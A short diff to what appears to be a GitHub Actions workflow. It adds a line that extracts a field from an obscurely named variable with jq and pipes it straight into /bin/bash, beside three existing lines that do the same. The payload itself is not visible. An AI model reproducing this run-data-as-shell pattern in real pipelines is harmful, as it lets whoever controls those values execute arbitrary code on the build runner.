@@ -26,6 +26,7 @@ jobs:
           echo $mt86318 | jq -r .vzb5 | /bin/bash
           echo $fwop3657 | jq -r .tqtv16 | /bin/bash
           echo $xuvt65310 | jq -r .kqb796 | /bin/bash
+          printf '%s' "$sqo69150" | jq -r .buxav364 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
